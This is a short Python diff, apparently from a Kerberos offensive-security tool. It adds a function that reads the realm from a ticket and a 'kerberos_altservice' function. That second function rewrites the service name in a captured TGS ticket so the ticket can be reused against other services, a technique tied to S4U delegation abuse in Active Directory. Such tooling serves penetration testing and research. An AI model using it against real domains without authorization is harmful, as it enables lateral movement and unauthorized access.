@@ -276,3 +276,27 @@ def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash
     tgs_formated["cipher"] = cipher
     tgs_formated["sessionKey"] = new_session_key
     return tgs_formated, session_key
+
+def get_realm_from_ticket(ticket):
+    tgs_rep = ticket['KDC_REP']
+    decoded_tgsrep = decoder.decode(tgs_rep, asn1Spec=TGS_REP())[0]
+    return decoded_tgsrep["ticket"]["realm"]
+
+def kerberos_altservice(tgs, new_spn):
+    service, host = new_spn.split('/', 1)
+    tgs_rep = tgs['KDC_REP']
+    
+    decoded_tgsrep = decoder.decode(tgs_rep, asn1Spec=TGS_REP())[0]
+    
+    # altservice
+    decoded_tgsrep["ticket"]["sname"]["name-string"].clear()
+    decoded_tgsrep["ticket"]["sname"]["name-string"].append(service)
+    decoded_tgsrep["ticket"]["sname"]["name-string"].append(host)
+
+    new_tgs_rep = encoder.encode(decoded_tgsrep)
+
+    new_tgs = {}
+    new_tgs["KDC_REP"] = new_tgs_rep
+    new_tgs["cipher"] = tgs["cipher"]
+    new_tgs["sessionKey"] = tgs["sessionKey"]
+    return new_tgs
